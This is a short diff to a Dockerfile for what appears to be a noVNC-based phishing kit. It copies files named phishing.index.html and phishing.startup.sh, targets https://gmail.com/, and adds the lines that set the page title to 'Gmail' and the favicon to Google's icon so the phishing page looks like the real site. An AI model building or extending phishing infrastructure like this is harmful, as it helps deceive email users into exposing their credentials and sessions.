@@ -20,4 +20,6 @@ RUN apt-get update && \
 COPY script/phishing.index.html /usr/share/novnc/index.html
 COPY script/phishing.startup.sh /startup.sh
 ENV WEBSITE="https://gmail.com/"
+ENV TITLE="Gmail"
+ENV FAVICON="https://www.google.com/favicon.ico"
 ENTRYPOINT [ "/bin/bash", "/startup.sh" ]
